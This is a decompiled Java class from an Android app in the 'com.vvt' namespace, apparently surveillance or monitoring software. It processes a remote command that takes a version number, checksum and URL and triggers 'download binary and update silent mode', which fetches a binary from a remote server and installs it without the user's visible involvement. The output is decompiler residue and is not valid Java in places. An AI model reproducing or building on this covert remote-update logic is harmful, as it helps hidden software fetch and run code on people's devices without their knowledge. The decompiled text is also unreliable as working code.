package com.vvt.remotecommand.processor.misc;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.input.RmtCtrlInputDownloadBinaryAndUpdateSilentMode;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import java.util.ArrayList;
import java.util.Iterator;

public class o
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public o(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  private void a(ArrayList paramArrayList)
  {
    boolean bool1 = a;
    if (bool1) {}
    int i = paramArrayList.size();
    int k = 3;
    Object localObject;
    if (i != k)
    {
      localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject).<init>();
      throw ((Throwable)localObject);
    }
    try
    {
      Iterator localIterator = paramArrayList.iterator();
      int j;
      int m;
      do
      {
        boolean bool2 = localIterator.hasNext();
        if (!bool2) {
          return;
        }
        localObject = localIterator.next();
        localObject = (String)localObject;
        if (localObject == null) {
          break;
        }
        j = ((String)localObject).length();
        m = 1;
      } while (j >= m);
      localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject).<init>();
      throw ((Throwable)localObject);
    }
    catch (NullPointerException localNullPointerException)
    {
      InvalidCommanFormatException localInvalidCommanFormatException = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      localInvalidCommanFormatException.<init>();
      throw localInvalidCommanFormatException;
    }
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc) {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramRemoteCommand.getParameters();
    a((ArrayList)localObject1);
    bool1 = false;
    Object localObject2 = (String)((ArrayList)localObject1).get(0);
    Object localObject3 = (String)((ArrayList)localObject1).get(i);
    localObject1 = (String)((ArrayList)localObject1).get(2);
    boolean bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    com.vvt.remotecontrol.a locala = h();

    RmtCtrlInputDownloadBinaryAndUpdateSilentMode localRmtCtrlInputDownloadBinaryAndUpdateSilentMode = new com.vvt.remotecontrol.input.RmtCtrlInputDownloadBinaryAndUpdateSilentMode();
    localRmtCtrlInputDownloadBinaryAndUpdateSilentMode.setVersionNumber((String)localObject2);
    localRmtCtrlInputDownloadBinaryAndUpdateSilentMode.setChecksum((String)localObject3);
    localRmtCtrlInputDownloadBinaryAndUpdateSilentMode.setUrl((String)localObject1);
    localObject2 = new com.vvt.remotecontrol.ControlCommand(RemoteFunction.SET_DOWNLOAD_BINARY_AND_UPDATE_SILENT_MODE, localRmtCtrlInputDownloadBinaryAndUpdateSilentMode);
    boolean bool3 = a;
    if (bool3) {}
    localObject3 = locala.execute((ControlCommand)localObject2);
    if (paramc != null) {
      bool1 = localObject3 instanceof RmtCtrlOutputStatusMessage;
      if (bool1)
      {
        localObject2 = localObject3;
        localObject2 = (RmtCtrlOutputStatusMessage)localObject3;
        boolean bool4 = ((RmtCtrlOutputStatusMessage)localObject2).isSuccess();
        localObject2 = ((RmtCtrlOutputStatusMessage)localObject2).getMessage();
        bool2 = a;
        if (bool2) {}
        bool2 = a;
        if ((bool2) && (!bool4)) {
          break label244;
        }
        paramc.b(paramRemoteCommand, this, (String)localObject2);
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      label244:
      localObject3 = (RmtCtrlOutputStatusMessage)localObject3;
      localObject2 = ((RmtCtrlOutputStatusMessage)localObject3).getMessage();
      if (localObject2 != null)
      {
        int j = ((String)localObject2).length();
        if (j > i)
        {
          localObject3 = new com/vvt/remotecommand/exception/RemoteCommandException;
          ((RemoteCommandException)localObject3).<init>((String)localObject2);
          paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject3);
          continue;
        }
      }
      localObject2 = new com/vvt/remotecommand/exception/RemoteCommandException;
      localObject3 = "Unknown.";
      ((RemoteCommandException)localObject2).<init>((String)localObject3);
      paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject2);
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "Set download binary and update silent mode";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/misc/o.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */